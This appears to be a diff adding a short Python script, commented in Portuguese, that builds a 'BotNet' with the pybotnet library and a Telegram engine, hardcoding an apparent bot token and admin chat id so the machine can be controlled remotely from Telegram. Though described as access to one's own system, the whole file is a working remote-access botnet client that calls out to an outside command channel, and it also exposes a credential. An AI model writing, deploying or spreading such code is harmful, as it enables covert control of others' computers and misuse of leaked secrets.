@@ -1,0 +1,10 @@
+#--!---Esta sendo desenvolvido em Python3 por Keidi Francis
+# Com esse script terás acesso ao teu sistema, apartir do telegram por via bot.
+
+from pybotnet import BotNet,TelegramEngine
+
+telegram_engine = TelegramEngine(token="1086172966:AAHTLBf4VDaB8b1Bbx_ZZnc0_IPmwS5N0mM", admin_chat_id="56719623373708")
+
+
+botnet = BotNet(telegram_engine) # 
+botnet.run()
